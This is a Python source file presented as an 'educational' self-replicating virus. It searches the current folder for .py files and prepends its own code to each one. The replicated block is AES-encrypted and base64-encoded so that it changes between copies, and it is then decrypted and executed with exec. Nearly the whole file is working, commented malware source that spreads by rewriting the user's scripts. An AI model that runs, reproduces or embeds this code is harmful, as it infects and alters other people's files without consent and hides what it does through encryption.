#title           :mold-verbose.py
#description     :Example of a self replicating python virus (without extra payload). For educational purposes only :)
#author          :wizardofzos
#date            :20190622
#version         :0.3
#usage           :python mold-verbose.py
#notes           :make sure you know what you're doing before running this...
#==============================================================================

# We need the next comment line. This way we know what is the mold, and what is not...

# PIEMOLDER:START
def execute(virus):
	'''This function molds the pies. It finds all .py files in the current folder
	and then writes the content of 'virus' to the start of those files.

	We first make a .rotten version of the pie, then write our payload to it.
	Afterwards we append the content of the original file, delete the original
	and then rename the .rotten version to the normal .py version'''
	import glob
	import os
	# Find all pies
	allpies = glob.glob("*.py")

	for py in allpies:
		# For all pies we found...(but not ourself)
		if py != os.path.basename(__file__):
			# Create a .rotten version of the pie
			thepie = open(py, "r")
			rottenpie = open("%s.rotten" % py, "w")
			# Write 'virus' to the .rotten file
			rottenpie.write(virus)

			# append all the lines from the original .py
			for line in thepie.readlines():
				rottenpie.write(line)
			# always close your files
			thepie.close()
			rottenpie.close()
			# Then remove the orignal
			os.remove(py)
			# And rename the .rotten to the original name
			os.rename("%s.rotten" % py, py)


# Now that we have the function ready to add mold to pies, we better
# make sure that we add _ourselves_ to the pies. We read ourself
# and copy everything from the two 'magic' comment lines into
# a variable to pass to our 'execute' function (that we should probably rename to mold)
import os
virus = os.path.basename(__file__)
vfile = open(virus, "r")
copyover = False
vstring = ""
for line in vfile.readlines():
	if line.find("# PIEMOLDER:START") == 0:
		copyover = True
	if line.find("# PIEMOLDER:END") == 0:
		copyover = False
		vstring += line
	if copyover:
		vstring += line


# Now we have the full content of current files 'virus' in vstring
# Time to encrypt.
from Crypto.Cipher import AES 
import base64
# Create random key and iv
key = os.urandom(32)
iv4 = os.urandom(16)
cryptor = AES.new(key, AES.MODE_CFB, iv4)
# And encrypt the vstring
cryptedvstring = base64.b64encode(cryptor.encrypt(vstring))

# then we create a decrypt and run block to inject in the other pies
virus = "# PIEMOLDER:START\n"
virus += "from Crypto.Cipher import AES\n"
virus += "import base64\n"
virus += "cryptmold = '"
virus += cryptedvstring
virus += "'\n"
virus += "key = base64.b64decode('%s')\n" % base64.b64encode(key)
virus += "iv4 = base64.b64decode('%s')\n" % base64.b64encode(iv4)
virus += "decryptor = AES.new(key, AES.MODE_CFB, iv4)\n"
virus += "plainmold = decryptor.decrypt(base64.b64decode(cryptmold))\n"
virus += "exec plainmold\n"
virus += "# PIEMOLDER:END\n"

# And execute the molder with the that content...
execute(virus)


# PIEMOLDER:END



